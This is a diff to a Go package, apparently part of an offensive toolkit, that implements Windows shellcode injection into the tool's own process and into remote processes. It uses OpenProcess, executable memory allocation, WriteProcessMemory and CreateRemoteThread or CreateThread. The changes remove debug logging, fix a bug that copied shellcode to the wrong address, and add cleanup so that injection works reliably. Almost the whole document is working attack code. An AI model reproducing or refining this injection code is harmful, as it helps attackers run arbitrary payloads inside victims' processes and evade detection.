@@ -6,7 +6,6 @@ package processinjection
 import (
 	"bufio"
 	"errors"
-	"fmt"
 	"log"
 	"os/exec"
 	"strconv"
@@ -83,7 +82,6 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	fmt.Println(pi.ProcessId)
 	pidStr := strconv.Itoa(int(pi.ProcessId))
 	return RemoteInject(shellcode, pidStr)
 }
@@ -138,7 +136,6 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, err
 }
 
 func RemoteInject(shellcode []byte, pid string) (string, error) {
-	log.Printf("Remote Inject %s\n", pid)
 	intpid, err := strconv.Atoi(pid)
 	if err != nil {
 		return "", err
@@ -153,7 +150,6 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 	if procHandle == 0 {
 		return "", err
 	}
-	log.Printf("Got past open process\n")
 	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
 	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
 	var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
@@ -164,11 +160,9 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 		uint32(shellcodeLen),
 		flAllocationType,
 		flProtect)
-	log.Println(err)
 	if lpBaseAddress == 0 {
 		return "", err
 	}
-	log.Printf("Got past virtual alloc\n")
 	var nBytesWritten *uint32
 	writeMem, err := winapi.WriteProcessMemory(
 		procHandle,
@@ -179,7 +173,6 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 	if !writeMem {
 		return "", err
 	}
-	log.Printf("Got past write process memory\n")
 	var threadId uint32 = 0
 	var dwCreationFlags uint32 = 0
 	thread, err := winapi.CreateRemoteThread(
@@ -193,7 +186,6 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 	if thread == 0 {
 		return "", err
 	}
-	log.Printf("Got past create remote thread\n")
 	go func() {
 		windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
 		winapi.VirtualProtectEx(
@@ -203,9 +195,9 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 			newFlProtect,
 			&flProtect)
 		windows.CloseHandle(windows.Handle(thread))
+		winapi.VirtualFreeEx(windows.Handle(procHandle), lpBaseAddress, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(windows.Handle(procHandle))
 	}()
-	log.Printf("right before success")
 	return "[+] Success", nil
 }
 
@@ -219,22 +211,29 @@ func SelfInject(shellcode []byte) (string, error) {
 	if heap == 0 {
 		return "", err
 	}
-
-	memoryAddress, err := winapi.HeapAlloc(heap, winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
+	memoryAddress, err := winapi.HeapAlloc(syscall.Handle(heap), winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
 	if memoryAddress == 0 {
 		return "", err
 	}
-	err = winapi.RtlCopyMemory(uintptr(heap), uintptr(unsafe.Pointer(&shellcode[0])), uint32(shellcodeLen))
+	err = winapi.RtlCopyMemory(uintptr(memoryAddress), uintptr(unsafe.Pointer(&shellcode[0])), uint32(shellcodeLen))
 	var threadId uint32 = 0
 	var dwCreationFlags uint32 = 0
+	hThread, err := winapi.CreateThread(
+		uintptr(winapi.NullRef),
+		0,
+		uintptr(memoryAddress),
+		uintptr(winapi.NullRef),
+		dwCreationFlags,
+		&threadId)
+	if hThread == 0 {
+		winapi.HeapFree(heap, 0, memoryAddress)
+		winapi.HeapDestroy(heap)
+		return "", err
+	}
 	go func() {
-		winapi.CreateThread(
-			uintptr(winapi.NullRef),
-			0,
-			uintptr(heap),
-			uintptr(winapi.NullRef),
-			dwCreationFlags,
-			&threadId)
+		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+		winapi.HeapFree(heap, 0, memoryAddress)
+		winapi.HeapDestroy(heap)
 	}()
 	return "[+] Success", nil
 }
@@ -255,7 +254,7 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		return "", err
 	}
 
-	baseA, err := winapi.HeapAlloc(heap, winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
+	baseA, err := winapi.HeapAlloc(syscall.Handle(heap), winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
 	if baseA == 0 {
 		return "", err
 	}
@@ -278,9 +277,14 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		0,                 //sizeofstackreserve
 		0,                 //lpbytesbuffer
 	)
+	// cleanup
 	if err3 != nil {
+		winapi.HeapDestroy(heap)
 		return "", err3
 	}
+	// cant be run in go routine for some reason when using raw version.
+	windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
+	winapi.HeapDestroy(heap)
 	return "[+] Success", nil
 }
 
